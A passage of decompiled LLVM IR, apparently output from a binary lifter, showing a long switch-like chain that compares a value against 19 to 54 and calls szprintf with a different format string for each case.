  %v6_b0d4 = sext i8 %v3_b0c8 to i32
  %v8_b0d4 = call i32 @szprintf(i32 %v2_b0b0, i32 ptrtoint ([13 x i8]* @global_var_1efa4.119 to i32), i32 %v4_b0d4, i32 %v6_b0d4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b0d8

dec_label_pc_b0d8:                                ; preds = %dec_label_pc_b0a4, %dec_label_pc_b0b0
  %v7_b0dc = icmp eq i32 %v2_acd8, 19
  br i1 %v7_b0dc, label %dec_label_pc_b0e4, label %dec_label_pc_b10c

dec_label_pc_b0e4:                                ; preds = %dec_label_pc_b0d8
  %v2_b0e4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b0f0 = load i8, i8* @global_var_2a549.78, align 1
  %v3_b0fc = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b108 = sext i8 %v3_b0f0 to i32
  %v6_b108 = sext i8 %v3_b0fc to i32
  %v8_b108 = call i32 @szprintf(i32 %v2_b0e4, i32 ptrtoint ([11 x i8]* @global_var_1efb4.121 to i32), i32 %v4_b108, i32 %v6_b108, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b10c

dec_label_pc_b10c:                                ; preds = %dec_label_pc_b0d8, %dec_label_pc_b0e4
  %v7_b110 = icmp eq i32 %v2_acd8, 20
  br i1 %v7_b110, label %dec_label_pc_b118, label %dec_label_pc_b140

dec_label_pc_b118:                                ; preds = %dec_label_pc_b10c
  %v2_b118 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b124 = load i8, i8* @global_var_2a549.78, align 1
  %v3_b130 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b13c = sext i8 %v3_b124 to i32
  %v6_b13c = sext i8 %v3_b130 to i32
  %v8_b13c = call i32 @szprintf(i32 %v2_b118, i32 ptrtoint ([12 x i8]* @global_var_1efc0.123 to i32), i32 %v4_b13c, i32 %v6_b13c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b140

dec_label_pc_b140:                                ; preds = %dec_label_pc_b10c, %dec_label_pc_b118
  %v7_b144 = icmp eq i32 %v2_acd8, 21
  br i1 %v7_b144, label %dec_label_pc_b14c, label %dec_label_pc_b174

dec_label_pc_b14c:                                ; preds = %dec_label_pc_b140
  %v2_b14c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b158 = load i8, i8* @global_var_2a549.78, align 1
  %v3_b164 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b170 = sext i8 %v3_b158 to i32
  %v6_b170 = sext i8 %v3_b164 to i32
  %v8_b170 = call i32 @szprintf(i32 %v2_b14c, i32 ptrtoint ([13 x i8]* @global_var_1efcc.125 to i32), i32 %v4_b170, i32 %v6_b170, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b174

dec_label_pc_b174:                                ; preds = %dec_label_pc_b140, %dec_label_pc_b14c
  %v7_b178 = icmp eq i32 %v2_acd8, 22
  br i1 %v7_b178, label %dec_label_pc_b180, label %dec_label_pc_b1a8

dec_label_pc_b180:                                ; preds = %dec_label_pc_b174
  %v2_b180 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b18c = load i8, i8* @global_var_2a549.78, align 1
  %v3_b198 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b1a4 = sext i8 %v3_b18c to i32
  %v6_b1a4 = sext i8 %v3_b198 to i32
  %v8_b1a4 = call i32 @szprintf(i32 %v2_b180, i32 ptrtoint ([11 x i8]* @global_var_1efdc.127 to i32), i32 %v4_b1a4, i32 %v6_b1a4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b1a8

dec_label_pc_b1a8:                                ; preds = %dec_label_pc_b174, %dec_label_pc_b180
  %v7_b1ac = icmp eq i32 %v2_acd8, 23
  br i1 %v7_b1ac, label %dec_label_pc_b1b4, label %dec_label_pc_b1dc

dec_label_pc_b1b4:                                ; preds = %dec_label_pc_b1a8
  %v2_b1b4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b1c0 = load i8, i8* @global_var_2a549.78, align 1
  %v3_b1cc = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b1d8 = sext i8 %v3_b1c0 to i32
  %v6_b1d8 = sext i8 %v3_b1cc to i32
  %v8_b1d8 = call i32 @szprintf(i32 %v2_b1b4, i32 ptrtoint ([11 x i8]* @global_var_1efe8.129 to i32), i32 %v4_b1d8, i32 %v6_b1d8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b1dc

dec_label_pc_b1dc:                                ; preds = %dec_label_pc_b1a8, %dec_label_pc_b1b4
  %v7_b1e0 = icmp eq i32 %v2_acd8, 24
  br i1 %v7_b1e0, label %dec_label_pc_b1e8, label %dec_label_pc_b210

dec_label_pc_b1e8:                                ; preds = %dec_label_pc_b1dc
  %v2_b1e8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b1f4 = load i8, i8* @global_var_2a549.78, align 1
  %v3_b200 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b20c = sext i8 %v3_b1f4 to i32
  %v6_b20c = sext i8 %v3_b200 to i32
  %v8_b20c = call i32 @szprintf(i32 %v2_b1e8, i32 ptrtoint ([12 x i8]* @global_var_1eff4.131 to i32), i32 %v4_b20c, i32 %v6_b20c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b210

dec_label_pc_b210:                                ; preds = %dec_label_pc_b1dc, %dec_label_pc_b1e8
  %v7_b214 = icmp eq i32 %v2_acd8, 25
  br i1 %v7_b214, label %dec_label_pc_b21c, label %dec_label_pc_b244

dec_label_pc_b21c:                                ; preds = %dec_label_pc_b210
  %v2_b21c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b228 = load i8, i8* @global_var_2a549.78, align 1
  %v3_b234 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b240 = sext i8 %v3_b228 to i32
  %v6_b240 = sext i8 %v3_b234 to i32
  %v8_b240 = call i32 @szprintf(i32 %v2_b21c, i32 ptrtoint ([12 x i8]* @global_var_1f000.133 to i32), i32 %v4_b240, i32 %v6_b240, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b244

dec_label_pc_b244:                                ; preds = %dec_label_pc_b210, %dec_label_pc_b21c
  %v7_b248 = icmp eq i32 %v2_acd8, 26
  br i1 %v7_b248, label %dec_label_pc_b250, label %dec_label_pc_b278

dec_label_pc_b250:                                ; preds = %dec_label_pc_b244
  %v2_b250 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b25c = load i8, i8* @global_var_2a549.78, align 1
  %v3_b268 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b274 = sext i8 %v3_b25c to i32
  %v6_b274 = sext i8 %v3_b268 to i32
  %v8_b274 = call i32 @szprintf(i32 %v2_b250, i32 ptrtoint ([12 x i8]* @global_var_1f00c.135 to i32), i32 %v4_b274, i32 %v6_b274, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b278

dec_label_pc_b278:                                ; preds = %dec_label_pc_b244, %dec_label_pc_b250
  %v7_b27c = icmp eq i32 %v2_acd8, 27
  br i1 %v7_b27c, label %dec_label_pc_b284, label %dec_label_pc_b2ac

dec_label_pc_b284:                                ; preds = %dec_label_pc_b278
  %v2_b284 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b290 = load i8, i8* @global_var_2a549.78, align 1
  %v3_b29c = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b2a8 = sext i8 %v3_b290 to i32
  %v6_b2a8 = sext i8 %v3_b29c to i32
  %v8_b2a8 = call i32 @szprintf(i32 %v2_b284, i32 ptrtoint ([13 x i8]* @global_var_1f018.137 to i32), i32 %v4_b2a8, i32 %v6_b2a8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b2ac

dec_label_pc_b2ac:                                ; preds = %dec_label_pc_b278, %dec_label_pc_b284
  %v7_b2b0 = icmp eq i32 %v2_acd8, 28
  br i1 %v7_b2b0, label %dec_label_pc_b2b8, label %dec_label_pc_b2e0

dec_label_pc_b2b8:                                ; preds = %dec_label_pc_b2ac
  %v2_b2b8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b2c4 = load i8, i8* @global_var_2a549.78, align 1
  %v3_b2d0 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b2dc = sext i8 %v3_b2c4 to i32
  %v6_b2dc = sext i8 %v3_b2d0 to i32
  %v8_b2dc = call i32 @szprintf(i32 %v2_b2b8, i32 ptrtoint ([13 x i8]* @global_var_1f028.139 to i32), i32 %v4_b2dc, i32 %v6_b2dc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b2e0

dec_label_pc_b2e0:                                ; preds = %dec_label_pc_b2ac, %dec_label_pc_b2b8
  %v7_b2e4 = icmp eq i32 %v2_acd8, 29
  br i1 %v7_b2e4, label %dec_label_pc_b2ec, label %dec_label_pc_b314

dec_label_pc_b2ec:                                ; preds = %dec_label_pc_b2e0
  %v2_b2ec = ptrtoint i32* %stack_var_-36 to i32
  %v3_b2f8 = load i8, i8* @global_var_2a549.78, align 1
  %v3_b304 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b310 = sext i8 %v3_b2f8 to i32
  %v6_b310 = sext i8 %v3_b304 to i32
  %v8_b310 = call i32 @szprintf(i32 %v2_b2ec, i32 ptrtoint ([12 x i8]* @global_var_1f038.141 to i32), i32 %v4_b310, i32 %v6_b310, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b314

dec_label_pc_b314:                                ; preds = %dec_label_pc_b2e0, %dec_label_pc_b2ec
  %v7_b318 = icmp eq i32 %v2_acd8, 30
  br i1 %v7_b318, label %dec_label_pc_b320, label %dec_label_pc_b348

dec_label_pc_b320:                                ; preds = %dec_label_pc_b314
  %v2_b320 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b32c = load i8, i8* @global_var_2a549.78, align 1
  %v3_b338 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b344 = sext i8 %v3_b32c to i32
  %v6_b344 = sext i8 %v3_b338 to i32
  %v8_b344 = call i32 @szprintf(i32 %v2_b320, i32 ptrtoint ([13 x i8]* @global_var_1f044.143 to i32), i32 %v4_b344, i32 %v6_b344, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b348

dec_label_pc_b348:                                ; preds = %dec_label_pc_b314, %dec_label_pc_b320
  %v7_b34c = icmp eq i32 %v2_acd8, 31
  br i1 %v7_b34c, label %dec_label_pc_b354, label %dec_label_pc_b37c

dec_label_pc_b354:                                ; preds = %dec_label_pc_b348
  %v2_b354 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b360 = load i8, i8* @global_var_2a549.78, align 1
  %v3_b36c = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b378 = sext i8 %v3_b360 to i32
  %v6_b378 = sext i8 %v3_b36c to i32
  %v8_b378 = call i32 @szprintf(i32 %v2_b354, i32 ptrtoint ([12 x i8]* @global_var_1f054.145 to i32), i32 %v4_b378, i32 %v6_b378, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b37c

dec_label_pc_b37c:                                ; preds = %dec_label_pc_b348, %dec_label_pc_b354
  %v7_b380 = icmp eq i32 %v2_acd8, 32
  br i1 %v7_b380, label %dec_label_pc_b388, label %dec_label_pc_b3b0

dec_label_pc_b388:                                ; preds = %dec_label_pc_b37c
  %v2_b388 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b394 = load i8, i8* @global_var_2a549.78, align 1
  %v3_b3a0 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b3ac = sext i8 %v3_b394 to i32
  %v6_b3ac = sext i8 %v3_b3a0 to i32
  %v8_b3ac = call i32 @szprintf(i32 %v2_b388, i32 ptrtoint ([11 x i8]* @global_var_1f060.147 to i32), i32 %v4_b3ac, i32 %v6_b3ac, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b3b0

dec_label_pc_b3b0:                                ; preds = %dec_label_pc_b37c, %dec_label_pc_b388
  %v7_b3b4 = icmp eq i32 %v2_acd8, 33
  br i1 %v7_b3b4, label %dec_label_pc_b3bc, label %dec_label_pc_b3e4

dec_label_pc_b3bc:                                ; preds = %dec_label_pc_b3b0
  %v2_b3bc = ptrtoint i32* %stack_var_-36 to i32
  %v3_b3c8 = load i8, i8* @global_var_2a549.78, align 1
  %v3_b3d4 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b3e0 = sext i8 %v3_b3c8 to i32
  %v6_b3e0 = sext i8 %v3_b3d4 to i32
  %v8_b3e0 = call i32 @szprintf(i32 %v2_b3bc, i32 ptrtoint ([12 x i8]* @global_var_1f06c.149 to i32), i32 %v4_b3e0, i32 %v6_b3e0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b3e4

dec_label_pc_b3e4:                                ; preds = %dec_label_pc_b3b0, %dec_label_pc_b3bc
  %v7_b3e8 = icmp eq i32 %v2_acd8, 34
  br i1 %v7_b3e8, label %dec_label_pc_b3f0, label %dec_label_pc_b418

dec_label_pc_b3f0:                                ; preds = %dec_label_pc_b3e4
  %v2_b3f0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b3fc = load i8, i8* @global_var_2a549.78, align 1
  %v3_b408 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b414 = sext i8 %v3_b3fc to i32
  %v6_b414 = sext i8 %v3_b408 to i32
  %v8_b414 = call i32 @szprintf(i32 %v2_b3f0, i32 ptrtoint ([12 x i8]* @global_var_1f078.151 to i32), i32 %v4_b414, i32 %v6_b414, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b418

dec_label_pc_b418:                                ; preds = %dec_label_pc_b3e4, %dec_label_pc_b3f0
  %v7_b41c = icmp eq i32 %v2_acd8, 35
  br i1 %v7_b41c, label %dec_label_pc_b424, label %dec_label_pc_b44c

dec_label_pc_b424:                                ; preds = %dec_label_pc_b418
  %v2_b424 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b430 = load i8, i8* @global_var_2a549.78, align 1
  %v3_b43c = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b448 = sext i8 %v3_b430 to i32
  %v6_b448 = sext i8 %v3_b43c to i32
  %v8_b448 = call i32 @szprintf(i32 %v2_b424, i32 ptrtoint ([12 x i8]* @global_var_1f084.153 to i32), i32 %v4_b448, i32 %v6_b448, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b44c

dec_label_pc_b44c:                                ; preds = %dec_label_pc_b418, %dec_label_pc_b424
  %v7_b450 = icmp eq i32 %v2_acd8, 36
  br i1 %v7_b450, label %dec_label_pc_b458, label %dec_label_pc_b480

dec_label_pc_b458:                                ; preds = %dec_label_pc_b44c
  %v2_b458 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b464 = load i8, i8* @global_var_2a549.78, align 1
  %v3_b470 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b47c = sext i8 %v3_b464 to i32
  %v6_b47c = sext i8 %v3_b470 to i32
  %v8_b47c = call i32 @szprintf(i32 %v2_b458, i32 ptrtoint ([12 x i8]* @global_var_1f090.155 to i32), i32 %v4_b47c, i32 %v6_b47c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b480

dec_label_pc_b480:                                ; preds = %dec_label_pc_b44c, %dec_label_pc_b458
  %v7_b484 = icmp eq i32 %v2_acd8, 37
  br i1 %v7_b484, label %dec_label_pc_b48c, label %dec_label_pc_b4b4

dec_label_pc_b48c:                                ; preds = %dec_label_pc_b480
  %v2_b48c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b498 = load i8, i8* @global_var_2a549.78, align 1
  %v3_b4a4 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b4b0 = sext i8 %v3_b498 to i32
  %v6_b4b0 = sext i8 %v3_b4a4 to i32
  %v8_b4b0 = call i32 @szprintf(i32 %v2_b48c, i32 ptrtoint ([12 x i8]* @global_var_1f09c.157 to i32), i32 %v4_b4b0, i32 %v6_b4b0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b4b4

dec_label_pc_b4b4:                                ; preds = %dec_label_pc_b480, %dec_label_pc_b48c
  %v7_b4b8 = icmp eq i32 %v2_acd8, 38
  br i1 %v7_b4b8, label %dec_label_pc_b4c0, label %dec_label_pc_b4e8

dec_label_pc_b4c0:                                ; preds = %dec_label_pc_b4b4
  %v2_b4c0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b4cc = load i8, i8* @global_var_2a549.78, align 1
  %v3_b4d8 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b4e4 = sext i8 %v3_b4cc to i32
  %v6_b4e4 = sext i8 %v3_b4d8 to i32
  %v8_b4e4 = call i32 @szprintf(i32 %v2_b4c0, i32 ptrtoint ([13 x i8]* @global_var_1f0a8.159 to i32), i32 %v4_b4e4, i32 %v6_b4e4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b4e8

dec_label_pc_b4e8:                                ; preds = %dec_label_pc_b4b4, %dec_label_pc_b4c0
  %v7_b4ec = icmp eq i32 %v2_acd8, 39
  br i1 %v7_b4ec, label %dec_label_pc_b4f4, label %dec_label_pc_b51c

dec_label_pc_b4f4:                                ; preds = %dec_label_pc_b4e8
  %v2_b4f4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b500 = load i8, i8* @global_var_2a549.78, align 1
  %v3_b50c = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b518 = sext i8 %v3_b500 to i32
  %v6_b518 = sext i8 %v3_b50c to i32
  %v8_b518 = call i32 @szprintf(i32 %v2_b4f4, i32 ptrtoint ([13 x i8]* @global_var_1f0b8.161 to i32), i32 %v4_b518, i32 %v6_b518, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b51c

dec_label_pc_b51c:                                ; preds = %dec_label_pc_b4e8, %dec_label_pc_b4f4
  %v7_b520 = icmp eq i32 %v2_acd8, 40
  br i1 %v7_b520, label %dec_label_pc_b528, label %dec_label_pc_b550

dec_label_pc_b528:                                ; preds = %dec_label_pc_b51c
  %v2_b528 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b534 = load i8, i8* @global_var_2a549.78, align 1
  %v3_b540 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b54c = sext i8 %v3_b534 to i32
  %v6_b54c = sext i8 %v3_b540 to i32
  %v8_b54c = call i32 @szprintf(i32 %v2_b528, i32 ptrtoint ([13 x i8]* @global_var_1f0a8.159 to i32), i32 %v4_b54c, i32 %v6_b54c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b550

dec_label_pc_b550:                                ; preds = %dec_label_pc_b51c, %dec_label_pc_b528
  %v7_b554 = icmp eq i32 %v2_acd8, 41
  br i1 %v7_b554, label %dec_label_pc_b55c, label %dec_label_pc_b584

dec_label_pc_b55c:                                ; preds = %dec_label_pc_b550
  %v2_b55c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b568 = load i8, i8* @global_var_2a549.78, align 1
  %v3_b574 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b580 = sext i8 %v3_b568 to i32
  %v6_b580 = sext i8 %v3_b574 to i32
  %v8_b580 = call i32 @szprintf(i32 %v2_b55c, i32 ptrtoint ([13 x i8]* @global_var_1f0c8.163 to i32), i32 %v4_b580, i32 %v6_b580, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b584

dec_label_pc_b584:                                ; preds = %dec_label_pc_b550, %dec_label_pc_b55c
  %v7_b588 = icmp eq i32 %v2_acd8, 42
  br i1 %v7_b588, label %dec_label_pc_b590, label %dec_label_pc_b5b8

dec_label_pc_b590:                                ; preds = %dec_label_pc_b584
  %v2_b590 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b59c = load i8, i8* @global_var_2a549.78, align 1
  %v3_b5a8 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b5b4 = sext i8 %v3_b59c to i32
  %v6_b5b4 = sext i8 %v3_b5a8 to i32
  %v8_b5b4 = call i32 @szprintf(i32 %v2_b590, i32 ptrtoint ([13 x i8]* @global_var_1f0d8.165 to i32), i32 %v4_b5b4, i32 %v6_b5b4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b5b8

dec_label_pc_b5b8:                                ; preds = %dec_label_pc_b584, %dec_label_pc_b590
  %v7_b5bc = icmp eq i32 %v2_acd8, 43
  br i1 %v7_b5bc, label %dec_label_pc_b5c4, label %dec_label_pc_b5ec

dec_label_pc_b5c4:                                ; preds = %dec_label_pc_b5b8
  %v2_b5c4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b5d0 = load i8, i8* @global_var_2a549.78, align 1
  %v3_b5dc = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b5e8 = sext i8 %v3_b5d0 to i32
  %v6_b5e8 = sext i8 %v3_b5dc to i32
  %v8_b5e8 = call i32 @szprintf(i32 %v2_b5c4, i32 ptrtoint ([13 x i8]* @global_var_1f0e8.167 to i32), i32 %v4_b5e8, i32 %v6_b5e8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b5ec

dec_label_pc_b5ec:                                ; preds = %dec_label_pc_b5b8, %dec_label_pc_b5c4
  %v7_b5f0 = icmp eq i32 %v2_acd8, 44
  br i1 %v7_b5f0, label %dec_label_pc_b5f8, label %dec_label_pc_b620

dec_label_pc_b5f8:                                ; preds = %dec_label_pc_b5ec
  %v2_b5f8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b604 = load i8, i8* @global_var_2a549.78, align 1
  %v3_b610 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b61c = sext i8 %v3_b604 to i32
  %v6_b61c = sext i8 %v3_b610 to i32
  %v8_b61c = call i32 @szprintf(i32 %v2_b5f8, i32 ptrtoint ([13 x i8]* @global_var_1f0d8.165 to i32), i32 %v4_b61c, i32 %v6_b61c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b620

dec_label_pc_b620:                                ; preds = %dec_label_pc_b5ec, %dec_label_pc_b5f8
  %v7_b624 = icmp eq i32 %v2_acd8, 45
  br i1 %v7_b624, label %dec_label_pc_b62c, label %dec_label_pc_b654

dec_label_pc_b62c:                                ; preds = %dec_label_pc_b620
  %v2_b62c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b638 = load i8, i8* @global_var_2a549.78, align 1
  %v3_b644 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b650 = sext i8 %v3_b638 to i32
  %v6_b650 = sext i8 %v3_b644 to i32
  %v8_b650 = call i32 @szprintf(i32 %v2_b62c, i32 ptrtoint ([13 x i8]* @global_var_1f0f8.169 to i32), i32 %v4_b650, i32 %v6_b650, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b654

dec_label_pc_b654:                                ; preds = %dec_label_pc_b620, %dec_label_pc_b62c
  %v7_b658 = icmp eq i32 %v2_acd8, 46
  br i1 %v7_b658, label %dec_label_pc_b660, label %dec_label_pc_b688

dec_label_pc_b660:                                ; preds = %dec_label_pc_b654
  %v2_b660 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b66c = load i8, i8* @global_var_2a549.78, align 1
  %v3_b678 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b684 = sext i8 %v3_b66c to i32
  %v6_b684 = sext i8 %v3_b678 to i32
  %v8_b684 = call i32 @szprintf(i32 %v2_b660, i32 ptrtoint ([13 x i8]* @global_var_1f108.171 to i32), i32 %v4_b684, i32 %v6_b684, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b688

dec_label_pc_b688:                                ; preds = %dec_label_pc_b654, %dec_label_pc_b660
  %v7_b68c = icmp eq i32 %v2_acd8, 47
  br i1 %v7_b68c, label %dec_label_pc_b694, label %dec_label_pc_b6bc

dec_label_pc_b694:                                ; preds = %dec_label_pc_b688
  %v2_b694 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b6a0 = load i8, i8* @global_var_2a549.78, align 1
  %v3_b6ac = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b6b8 = sext i8 %v3_b6a0 to i32
  %v6_b6b8 = sext i8 %v3_b6ac to i32
  %v8_b6b8 = call i32 @szprintf(i32 %v2_b694, i32 ptrtoint ([13 x i8]* @global_var_1f118.173 to i32), i32 %v4_b6b8, i32 %v6_b6b8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b6bc

dec_label_pc_b6bc:                                ; preds = %dec_label_pc_b688, %dec_label_pc_b694
  %v7_b6c0 = icmp eq i32 %v2_acd8, 48
  br i1 %v7_b6c0, label %dec_label_pc_b6c8, label %dec_label_pc_b6f0

dec_label_pc_b6c8:                                ; preds = %dec_label_pc_b6bc
  %v2_b6c8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b6d4 = load i8, i8* @global_var_2a549.78, align 1
  %v3_b6e0 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b6ec = sext i8 %v3_b6d4 to i32
  %v6_b6ec = sext i8 %v3_b6e0 to i32
  %v8_b6ec = call i32 @szprintf(i32 %v2_b6c8, i32 ptrtoint ([13 x i8]* @global_var_1f128.175 to i32), i32 %v4_b6ec, i32 %v6_b6ec, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b6f0

dec_label_pc_b6f0:                                ; preds = %dec_label_pc_b6bc, %dec_label_pc_b6c8
  %v7_b6f4 = icmp eq i32 %v2_acd8, 49
  br i1 %v7_b6f4, label %dec_label_pc_b6fc, label %dec_label_pc_b724

dec_label_pc_b6fc:                                ; preds = %dec_label_pc_b6f0
  %v2_b6fc = ptrtoint i32* %stack_var_-36 to i32
  %v3_b708 = load i8, i8* @global_var_2a549.78, align 1
  %v3_b714 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b720 = sext i8 %v3_b708 to i32
  %v6_b720 = sext i8 %v3_b714 to i32
  %v8_b720 = call i32 @szprintf(i32 %v2_b6fc, i32 ptrtoint ([13 x i8]* @global_var_1f138.177 to i32), i32 %v4_b720, i32 %v6_b720, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b724

dec_label_pc_b724:                                ; preds = %dec_label_pc_b6f0, %dec_label_pc_b6fc
  %v7_b728 = icmp eq i32 %v2_acd8, 50
  br i1 %v7_b728, label %dec_label_pc_b730, label %dec_label_pc_b758

dec_label_pc_b730:                                ; preds = %dec_label_pc_b724
  %v2_b730 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b73c = load i8, i8* @global_var_2a549.78, align 1
  %v3_b748 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b754 = sext i8 %v3_b73c to i32
  %v6_b754 = sext i8 %v3_b748 to i32
  %v8_b754 = call i32 @szprintf(i32 %v2_b730, i32 ptrtoint ([13 x i8]* @global_var_1f148.179 to i32), i32 %v4_b754, i32 %v6_b754, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b758

dec_label_pc_b758:                                ; preds = %dec_label_pc_b724, %dec_label_pc_b730
  %v7_b75c = icmp eq i32 %v2_acd8, 51
  br i1 %v7_b75c, label %dec_label_pc_b764, label %dec_label_pc_b78c

dec_label_pc_b764:                                ; preds = %dec_label_pc_b758
  %v2_b764 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b770 = load i8, i8* @global_var_2a549.78, align 1
  %v3_b77c = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b788 = sext i8 %v3_b770 to i32
  %v6_b788 = sext i8 %v3_b77c to i32
  %v8_b788 = call i32 @szprintf(i32 %v2_b764, i32 ptrtoint ([14 x i8]* @global_var_1f158.181 to i32), i32 %v4_b788, i32 %v6_b788, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b78c

dec_label_pc_b78c:                                ; preds = %dec_label_pc_b758, %dec_label_pc_b764
  %v7_b790 = icmp eq i32 %v2_acd8, 52
  br i1 %v7_b790, label %dec_label_pc_b798, label %dec_label_pc_b7c0

dec_label_pc_b798:                                ; preds = %dec_label_pc_b78c
  %v2_b798 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b7a4 = load i8, i8* @global_var_2a549.78, align 1
  %v3_b7b0 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b7bc = sext i8 %v3_b7a4 to i32
  %v6_b7bc = sext i8 %v3_b7b0 to i32
  %v8_b7bc = call i32 @szprintf(i32 %v2_b798, i32 ptrtoint ([13 x i8]* @global_var_1f168.183 to i32), i32 %v4_b7bc, i32 %v6_b7bc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b7c0

dec_label_pc_b7c0:                                ; preds = %dec_label_pc_b78c, %dec_label_pc_b798
  %v7_b7c4 = icmp eq i32 %v2_acd8, 53
  br i1 %v7_b7c4, label %dec_label_pc_b7cc, label %dec_label_pc_b7f4

dec_label_pc_b7cc:                                ; preds = %dec_label_pc_b7c0
  %v2_b7cc = ptrtoint i32* %stack_var_-36 to i32
  %v3_b7d8 = load i8, i8* @global_var_2a549.78, align 1
  %v3_b7e4 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_b7f0 = sext i8 %v3_b7d8 to i32
  %v6_b7f0 = sext i8 %v3_b7e4 to i32
  %v8_b7f0 = call i32 @szprintf(i32 %v2_b7cc, i32 ptrtoint ([14 x i8]* @global_var_1f178.185 to i32), i32 %v4_b7f0, i32 %v6_b7f0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b7f4

dec_label_pc_b7f4:                                ; preds = %dec_label_pc_b7c0, %dec_label_pc_b7cc
  %v7_b7f8 = icmp eq i32 %v2_acd8, 54
  br i1 %v7_b7f8, label %dec_label_pc_b800, label %dec_label_pc_b828

dec_label_pc_b800:                                ; preds = %dec_label_pc_b7f4
  %v2_b800 = ptrtoint i32* %stack_var_-36 to i32
